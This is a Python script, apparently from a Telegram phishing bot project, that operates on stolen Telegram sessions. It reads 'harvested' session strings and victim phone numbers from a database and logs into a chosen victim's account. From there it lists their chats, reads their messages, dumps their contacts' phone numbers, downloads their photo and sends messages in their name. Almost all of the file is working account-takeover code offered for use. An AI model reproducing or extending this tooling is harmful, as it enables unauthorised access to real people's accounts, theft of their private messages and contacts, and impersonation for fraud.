"""Tool to access harvested Telegram sessions from sessions.db.

Usage:
    python tools/harvest_tool.py

This script:
    1. Lists all harvested sessions from data/sessions.db
    2. Lets you select a session to connect to
    3. Shows account info (dialogs, contacts, etc.)
    4. Can send messages, download files, etc.

Requirements:
    pip install telethon pysocks
"""

import asyncio
import sqlite3
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from telethon import TelegramClient
from telethon.sessions import StringSession
from bot.config import config


def list_sessions(db_path: str = "data/sessions.db"):
    """List all harvested sessions."""
    if not Path(db_path).exists():
        print(f"[!] Database not found: {db_path}")
        return []

    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM harvested_sessions WHERE is_valid = 1 ORDER BY auth_timestamp DESC")
    sessions = cursor.fetchall()
    conn.close()

    if not sessions:
        print("[!] No valid sessions found.")
        return []

    print("\n" + "="*70)
    print("HARVESTED SESSIONS")
    print("="*70)

    for i, s in enumerate(sessions, 1):
        print(f"\n[{i}] ID: {s['id']}")
        print(f"    Phone: {s['phone']}")
        print(f"    Username: @{s['victim_username'] or 'N/A'}")
        print(f"    TG ID: {s['victim_tg_id']}")
        print(f"    Device: {s['device_model']} | {s['system_version']}")
        print(f"    Proxy: {s['proxy_used']}")
        print(f"    Time: {s['auth_timestamp']}")

    print("\n" + "="*70)
    return sessions


async def access_session(session_string: str, phone: str):
    """Connect to a harvested account and show info."""
    print(f"\n[+] Connecting to {phone}...")

    client = TelegramClient(
        StringSession(session_string),
        config.TELEGRAM_API_ID,
        config.TELEGRAM_API_HASH,
    )

    try:
        await client.connect()

        if not await client.is_user_authorized():
            print("[!] Session is NOT authorized (expired/invalid)")
            await client.disconnect()
            return

        me = await client.get_me()
        print(f"\n[+] Connected!")
        print(f"    Name: {me.first_name} {me.last_name or ''}")
        print(f"    Username: @{me.username or 'N/A'}")
        print(f"    Phone: {me.phone}")
        print(f"    ID: {me.id}")

        # Get dialogs (chats)
        print(f"\n[+] Loading dialogs...")
        dialogs = await client.get_dialogs(limit=20)
        print(f"    Total dialogs: {len(dialogs)}")

        print("\n    Recent chats:")
        for i, dialog in enumerate(dialogs[:10], 1):
            entity = dialog.entity
            name = getattr(entity, 'title', None) or f"{getattr(entity, 'first_name', '')} {getattr(entity, 'last_name', '')}".strip()
            unread = dialog.unread_count
            print(f"    {i}. {name} (unread: {unread})")

        # Get contacts
        print(f"\n[+] Loading contacts...")
        contacts = await client(GetContactsRequest(hash=0))
        print(f"    Total contacts: {len(contacts.users)}")

        # Menu
        while True:
            print("\n" + "="*50)
            print("COMMANDS:")
            print("  1. Send message to chat")
            print("  2. Get last messages from chat")
            print("  3. Download profile photo")
            print("  4. List contacts")
            print("  5. Exit")
            print("="*50)

            choice = input("\nChoice: ").strip()

            if choice == "1":
                chat_id = input("Chat ID or username: ").strip()
                msg = input("Message: ").strip()
                try:
                    await client.send_message(chat_id, msg)
                    print("[+] Message sent!")
                except Exception as e:
                    print(f"[!] Error: {e}")

            elif choice == "2":
                chat_id = input("Chat ID or username: ").strip()
                limit = int(input("How many messages: ").strip() or "10")
                try:
                    messages = await client.get_messages(chat_id, limit=limit)
                    print(f"\n--- Last {len(messages)} messages ---")
                    for msg in messages:
                        sender = msg.sender_id or "Unknown"
                        text = msg.text or "[no text]"
                        print(f"[{sender}]: {text[:100]}")
                except Exception as e:
                    print(f"[!] Error: {e}")

            elif choice == "3":
                try:
                    photo_path = await client.download_profile_photo(me, file=f"data/photo_{me.id}.jpg")
                    print(f"[+] Photo saved: {photo_path}")
                except Exception as e:
                    print(f"[!] Error: {e}")

            elif choice == "4":
                for i, user in enumerate(contacts.users[:20], 1):
                    name = f"{user.first_name} {user.last_name or ''}".strip()
                    print(f"{i}. {name} (@{user.username or 'N/A'}) | {user.phone or 'no phone'}")

            elif choice == "5":
                break

            else:
                print("[!] Invalid choice")

        await client.disconnect()
        print("\n[-] Disconnected")

    except Exception as e:
        print(f"[!] Connection error: {e}")
        await client.disconnect()


async def main():
    sessions = list_sessions()
    if not sessions:
        return

    while True:
        choice = input("\nEnter session number to access (or 'q' to quit): ").strip()
        if choice.lower() == 'q':
            break

        try:
            idx = int(choice) - 1
            if 0 <= idx < len(sessions):
                s = sessions[idx]
                await access_session(s['session_string'], s['phone'])
            else:
                print("[!] Invalid number")
        except ValueError:
            print("[!] Enter a number or 'q'")


if __name__ == "__main__":
    asyncio.run(main())
